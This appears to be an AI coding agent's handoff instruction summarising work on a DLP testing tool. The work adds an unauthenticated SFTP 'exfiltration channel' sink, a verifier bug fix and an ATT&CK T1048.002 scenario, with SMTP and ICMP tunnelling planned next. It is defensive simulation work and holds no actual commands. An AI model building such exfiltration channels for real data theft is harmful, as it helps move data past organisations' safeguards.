Report to the user: the SFTP exfiltration channel is live — `internal/sftpsink` binds container-internal `:22` (published externally on the configurable, non-22 `SINK_SFTP_PORT`, default `2222`, to avoid colliding with the deployment host's real `sshd`), accepts unauthenticated (`NoClientAuth`) write-only SFTP sessions, and writes into the exact same `dlp_sink_receipts` table the HTTPS and DNS channels already use. A real, previously-shipped bug in `dlpVerifier` was found and fixed along the way: a step whose client tool was absent would have silently graded as "DLP blocked it" — now correctly resolves to an unevaluable/skipped result, proven not to affect either existing channel via regression test. A new scenario (`dlp-exfiltration-sftp.yaml`, T1048.002) proves the full loop end-to-end. Per the user's own prioritized roadmap from brainstorming, SMTP/E-mail is next, then ICMP tunneling, before cloud storage APIs or webhook-style channels.

Then use the **finishing-a-development-branch** skill to verify tests one more time, detect the environment, and present the standard merge/PR/keep-as-is menu — per this session's established pattern, this plan runs directly on `main` in the current working tree (no worktree).
